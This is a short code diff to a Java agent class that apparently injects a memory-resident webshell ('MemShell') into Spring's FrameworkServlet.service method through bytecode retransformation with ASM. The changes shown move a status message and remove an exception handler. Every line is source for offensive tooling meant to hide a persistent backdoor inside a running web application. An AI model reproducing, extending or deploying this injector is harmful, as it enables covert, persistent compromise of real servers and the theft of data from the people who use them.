@@ -33,7 +33,6 @@ public class SpringWebMvcFrameworkServletAgentInjector implements ClassFileTrans
             String name = allLoadedClass.getName();
             if (TARGET_CLASS.replace("/", ".").equals(name)) {
                 inst.retransformClasses(allLoadedClass);
-                System.out.println("MemShell Agent is working at org.springframework.web.servlet.FrameworkServlet.service");
             }
         }
     }
@@ -53,6 +52,7 @@ public class SpringWebMvcFrameworkServletAgentInjector implements ClassFileTrans
                 };
                 ClassVisitor cv = getClassVisitor(cw);
                 cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                System.out.println("MemShell Agent is working at " + TARGET_CLASS.replace("/", ".") + "." + TARGET_METHOD_NAME);
                 return cw.toByteArray();
             } catch (Exception e) {
                 e.printStackTrace();
@@ -69,12 +69,8 @@ public class SpringWebMvcFrameworkServletAgentInjector implements ClassFileTrans
                                              String signature, String[] exceptions) {
                 MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                 if (TARGET_METHOD_NAME.equals(name)) {
-                    try {
-                        Type[] argumentTypes = Type.getArgumentTypes(descriptor);
-                        return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
-                    } catch (Exception e) {
-                        e.printStackTrace();
-                    }
+                    Type[] argumentTypes = Type.getArgumentTypes(descriptor);
+                    return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
                 }
                 return mv;
             }
